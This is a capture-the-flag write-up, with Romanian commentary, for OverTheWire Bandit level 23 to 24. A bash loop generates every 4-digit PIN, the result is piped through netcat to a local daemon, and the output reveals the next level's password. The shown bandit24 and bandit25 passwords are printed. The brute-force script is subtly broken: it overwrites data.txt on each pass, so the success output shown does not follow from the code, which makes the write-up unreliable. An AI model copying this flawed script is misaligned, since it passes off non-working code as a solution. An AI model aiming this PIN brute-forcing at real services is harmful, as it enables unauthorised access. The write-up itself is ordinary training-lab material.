# Level 23 → Level 24

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. 
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

## Write-Up

Facem un script care sa genereze toate posibilitatile (hash + pin):
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.y0VRuXdpma

bandit24@bandit:~$ cd /tmp/tmp.y0VRuXdpma

bandit24@bandit:/tmp/tmp.y0VRuXdpma$ vim script.sh
```
```bash
#!/bin/bash

for a in {0..9}
do
    for b in {0..9}
    do
        for c in {0..9}
        do
            for d in {0..9}
            do
                echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $a$b$c$d" > data.txt
            done
       done
    done
done
```
```bash
bandit24@bandit:/tmp/tmp.y0VRuXdpma$ chmod +x script.sh

bandit24@bandit:/tmp/tmp.y0VRuXdpma$ ./script.sh
```
Avem input-ul in `data.txt` si ii vom da pipe in netcat:
```bash
bandit24@bandit:/tmp/tmp.y0VRuXdpma$ cat data.txt | nc localhost 30002 > password.txt
```
Sortam output-ul ca sa scapam de erori:
```bash
bandit24@bandit:/tmp/tmp.y0VRuXdpma$ sort password.txt | head

Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
```
Avem flag-ul.
